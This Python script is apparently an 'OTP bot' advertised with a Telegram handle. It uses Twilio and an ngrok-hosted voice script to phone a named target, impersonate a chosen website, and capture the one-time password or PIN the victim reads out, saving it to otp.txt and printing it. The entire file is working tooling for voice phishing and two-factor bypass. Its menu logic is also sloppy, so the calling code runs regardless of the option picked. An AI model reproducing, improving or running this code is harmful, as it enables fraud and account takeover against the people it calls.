#!/usr/bin/python -u
import sys
from typing import TextIO
import os
import time
from twilio.rest import Client
import json
import shelve
    
def menu():

        ''' Main menu to choose an item '''

chosen_element = 0

print("#############################################################################")
print("########	                                                     ########")
print("########     ░█████╗░████████╗██████╗░░░██████╗░░█████╗░████████╗    ########")
print("########     ██╔══██╗╚══██╔══╝██╔══██╗░░██╔══██╗██╔══██╗╚══██╔══╝    ########")
print("########     ██║░░██║░░░██║░░░██████╔╝░░██████╦╝██║░░██║░░░██║░░░    ########")
print("########     ██║░░██║░░░██║░░░██╔═══╝░░░██╔══██╗██║░░██║░░░██║░░░    ########")
print("########     ╚█████╔╝░░░██║░░░██║░░░░░░░██████╦╝╚█████╔╝░░░██║░░░    ########")
print("########     ░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░╚═════╝░░╚════╝░░░░╚═╝░░░    ########")
print("########	                                                     ########")
print("########	        1) RETRIEVE OTP             3) HELP          ########")
print("########	        2) SETTINGS                 4) EXIT          ########")
print("########	                                                     ########")
print("########	                              telegram:@psych3delian ########")
print("#############################################################################")
chosen_element = input("Enter a number from 1 to 4: ")

if int(chosen_element) == 1:

    if not 'otp.txt' in os.listdir():
        open('otp.txt', 'w').close()
    if not 'name.txt' in os.listdir():
        open('name.txt', 'w').close()
    if not 'to.txt' in os.listdir():
        open('to.txt', 'w').close()
    if not 'site.txt' in os.listdir():
        open('site.txt', 'w').close()

    raw_config = json.loads(open('Config.txt', 'r').read())

    send2 = open('to.txt', 'r').read()
    account_sid = raw_config['account_sid']
    auth_token = raw_config['auth_token']
    twilio_number = raw_config['twilio_number']
    ngrok = raw_config['ngrok_url']
    client = Client(account_sid, auth_token)

    outfile = open("name.txt", "w")
    name = input("Please enter target's name: ")
    outfile.write(name)
    outfile.close()

    outfile = open("site.txt", "w")
    site = input("Please enter name of website: ")
    outfile.write(site)
    outfile.close()

    outfile = open("to.txt", "w")
    send2 = input("Please enter target's phone number: ")
    outfile.write(send2)
    outfile.close()

print(" ")
input("***PLEASE RUN/RESTART THE VOICE.PY FILE NOW AND PRESS ENTER TO CONTINUE***")
print(" ")

call = client.calls.create(
    status_callback=f'{ngrok}/voice',
    status_callback_event=['queued', 'initiated', 'answered', 'ringing', 'canceled', 'completed', 'busy', 'no-answer', 'failed'],
    status_callback_method='POST',
    url=f'{ngrok}/voice',
    to=f'{send2}',
    from_=f'{twilio_number}')



sid = call.sid
print(call.sid)
a = 0
b = 0
c = 0
d = 0
while True:
        if client.calls(sid).fetch().status == 'queued':
            if not a >= 1:
                a = a + 1
                print("queued")
        elif client.calls(sid).fetch().status == 'ringing':
            if not b >= 1:
                b = b + 1
                print("ringing")
        elif client.calls(sid).fetch().status == 'in-progress':
            if not c >= 1:
                c = c + 1
                print("inprogress")
        elif client.calls(sid).fetch().status == 'completed':
            print("completed")
            break
        elif client.calls(sid).fetch().status == 'failed':
            print("failed")
            break
        elif client.calls(sid).fetch().status == 'no-answer':
            print("noanswer")
            break
        elif client.calls(sid).fetch().status == 'canceled':
            print("canceled")
            break
        elif client.calls(sid).fetch().status == 'busy':
            print("busy")

otp = open(f'otp.txt', 'r').read()
if otp == '':
        print("no_otp")
else:
        print({otp}),

check = input("Press enter to exit: ")
if check.upper() == "":
    exit()

if int(chosen_element) == 2:
    print(" ")
    print("All settings are located in the Config.txt file, open it and configure it as shown.")
    print(" ")

check = input("Press enter to exit: ")
if check.upper() == "":
    exit()

if int(chosen_element) == 3:
    print("Set your configuration in the config.txt file, '")
    print("Open 2 command prompts and change directory of 2 of them to same directory as OTP bot, open another cmd prompt and start ngrok 'ngrok http 5000'")
    print(", type 'python voice.otp' to load the voice elements, and 'python bot.py' to load the bot. Complete neccesary information in bot to set your variables.")
    print("type phone number, and hit enter. Call status will update and if otp or pin given it will be displaayed at the bottom.")
    print("remember to restart voice.py every time you chnange something.")
else:
    print('Sorry, the value entered must be a number from 1 to 5, then try again!')
if int(chosen_element) == 4:
    sys.exit()
else:
    print('Sorry, the value entered must be a number from 1 to 5, then try again!')

if __name__ == '__main__':
    ''' Python script main function '''

